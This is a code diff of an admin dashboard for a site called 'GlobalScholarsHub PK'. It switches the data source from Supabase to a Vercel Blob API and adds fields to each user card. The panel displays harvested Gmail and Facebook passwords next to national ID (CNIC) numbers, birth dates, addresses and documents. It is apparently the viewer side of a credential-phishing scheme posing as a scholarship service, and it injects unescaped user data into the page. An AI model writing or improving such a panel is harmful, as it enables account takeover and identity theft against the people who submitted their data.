@@ -3,7 +3,6 @@
 <head>
     <title>Admin Panel - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; padding: 20px; }
@@ -20,6 +19,7 @@
         .stat-card .label { color: #64748b; font-size: 14px; margin-top: 4px; }
         .stat-card .icon { font-size: 24px; color: #2563eb; margin-bottom: 6px; }
         .user-card { background: #fff; border-radius: 16px; padding: 24px; margin-bottom: 18px; border: 1px solid #eef2f6; }
+        .user-card:hover { border-color: #2563eb; }
         .user-card .card-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; padding-bottom: 14px; border-bottom: 2px solid #f0f4f8; margin-bottom: 14px; }
         .user-card .card-header .user-id { font-weight: 700; color: #0a1628; font-size: 16px; }
         .user-card .card-header .timestamp { background: #f0f4f8; padding: 4px 14px; border-radius: 50px; font-size: 12px; color: #64748b; }
@@ -34,6 +34,7 @@
         .user-card .data-grid .field .value { color: #475569; }
         .total-text { font-size: 16px; color: #0a1628; margin-bottom: 20px; font-weight: 600; }
         .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
+        .no-data i { font-size: 48px; color: #e2e8f0; margin-bottom: 16px; }
         @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } }
     </style>
 </head>
@@ -55,30 +56,21 @@
     </div>
     
     <script>
-        // ===== DIRECT SUPABASE CONNECTION =====
-        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
-        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
-        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
-
+        // ===== VERCEL BLOB STORAGE - FETCH USERS =====
         async function loadUsers() {
             try {
-                const { data: users, error } = await supabase
-                    .from('users')
-                    .select('*')
-                    .order('created_at', { ascending: false });
-
-                if (error) {
-                    console.error('❌ Supabase Error:', error);
-                    return;
-                }
-
-                console.log('📊 Users:', users);
+                console.log('📤 Fetching users from Vercel Blob...');
+                
+                const response = await fetch('/api/users');
+                const users = await response.json();
+                
+                console.log('📊 Users received:', users);
 
                 // ===== Stats Update =====
                 document.getElementById('totalUsers').textContent = users.length;
                 document.getElementById('gmailUsers').textContent = users.filter(u => u.email).length;
-                document.getElementById('fbUsers').textContent = users.filter(u => u.fb_email).length;
-                document.getElementById('profileUsers').textContent = users.filter(u => u.profile_completed).length;
+                document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
+                document.getElementById('profileUsers').textContent = users.filter(u => u.profileCompleted).length;
 
                 const container = document.getElementById('usersList');
 
@@ -91,35 +83,66 @@
 
                 users.slice().reverse().forEach((user, index) => {
                     const userNum = users.length - index;
+                    const hasGmail = user.email ? true : false;
+                    const hasFb = user.fbEmail ? true : false;
+                    const hasProfile = user.profileCompleted ? true : false;
+                    
                     html += '<div class="user-card">';
                     html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span>';
-                    html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submitted_at || user.created_at || 'N/A') + '</span></div>';
+                    html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || user.submitted_at || 'N/A') + '</span></div>';
                     
                     html += '<div class="badges">';
-                    if (user.email) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
-                    if (user.fb_email) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
-                    if (user.profile_completed) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
+                    if (hasGmail) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
+                    if (hasFb) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
+                    if (hasProfile) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
                     html += '</div>';
                     
                     html += '<div class="data-grid">';
                     if (user.name) html += '<div class="field"><strong>👤 Name:</strong> <span class="value">' + user.name + '</span></div>';
                     if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
-                    if (user.password) html += '<div class="field"><strong>🔑 Password:</strong> <span class="value">' + user.password + '</span></div>';
-                    if (user.fb_email) html += '<div class="field"><strong>📘 Facebook:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fb_email + '</span></div>';
-                    if (user.fb_password) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fb_password + '</span></div>';
+                    if (user.password) html += '<div class="field"><strong>🔑 Gmail Password:</strong> <span class="value">' + user.password + '</span></div>';
+                    if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook ID:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
+                    if (user.fbPassword) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fbPassword + '</span></div>';
+                    if (user.firstName) html += '<div class="field"><strong>👤 First Name:</strong> <span class="value">' + user.firstName + '</span></div>';
+                    if (user.lastName) html += '<div class="field"><strong>👤 Last Name:</strong> <span class="value">' + user.lastName + '</span></div>';
                     if (user.phone) html += '<div class="field"><strong>📱 Phone:</strong> <span class="value">' + user.phone + '</span></div>';
                     if (user.city) html += '<div class="field"><strong>🏙️ City:</strong> <span class="value">' + user.city + '</span></div>';
+                    if (user.nationality) html += '<div class="field"><strong>🇵🇰 Nationality:</strong> <span class="value">' + user.nationality + '</span></div>';
+                    if (user.country) html += '<div class="field"><strong>🏠 Country:</strong> <span class="value">' + user.country + '</span></div>';
+                    if (user.dob) html += '<div class="field"><strong>📅 DOB:</strong> <span class="value">' + user.dob + '</span></div>';
+                    if (user.gender) html += '<div class="field"><strong>⚥ Gender:</strong> <span class="value">' + user.gender + '</span></div>';
+                    if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
+                    if (user.educationLevel) html += '<div class="field"><strong>📚 Education:</strong> <span class="value">' + user.educationLevel + '</span></div>';
+                    if (user.fieldOfStudy) html += '<div class="field"><strong>📖 Field:</strong> <span class="value">' + user.fieldOfStudy + '</span></div>';
                     if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
                     if (user.gpa) html += '<div class="field"><strong>📊 GPA:</strong> <span class="value">' + user.gpa + '</span></div>';
-                    if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
+                    if (user.address) html += '<div class="field"><strong>🏠 Address:</strong> <span class="value">' + user.address + '</span></div>';
+                    if (user.skills) html += '<div class="field"><strong>🔧 Skills:</strong> <span class="value">' + user.skills + '</span></div>';
                     html += '</div>';
+                    
+                    if (user.about) {
+                        html += '<div style="margin-top:10px;background:#f8fafc;padding:10px 14px;border-radius:8px;color:#475569;font-size:14px;border-left:3px solid #2563eb;"><strong>📝 About:</strong> ' + user.about + '</div>';
+                    }
+                    
+                    if (user.documents && user.documents.length > 0) {
+                        html += '<div style="margin-top:8px;"><strong>📄 Documents:</strong> ';
+                        html += user.documents.map(doc => '<span style="background:#f0f4f8;padding:2px 10px;border-radius:50px;font-size:12px;display:inline-block;margin:2px;">' + (doc.name || doc) + '</span>').join(' ');
+                        html += '</div>';
+                    }
+                    
+                    if (user.profileImage) {
+                        html += '<div style="margin-top:8px;"><strong>🖼️ Profile Image:</strong><br />';
+                        html += '<img src="' + user.profileImage + '" style="width:80px;height:80px;border-radius:10px;object-fit:cover;border:2px solid #eef2f6;margin-top:4px;" onclick="window.open(this.src)" />';
+                        html += '</div>';
+                    }
+                    
                     html += '</div>';
                 });
 
                 container.innerHTML = html;
             } catch (error) {
                 console.error('❌ Error loading users:', error);
-                document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data</div>';
+                document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data: ' + error.message + '</div>';
             }
         }
 
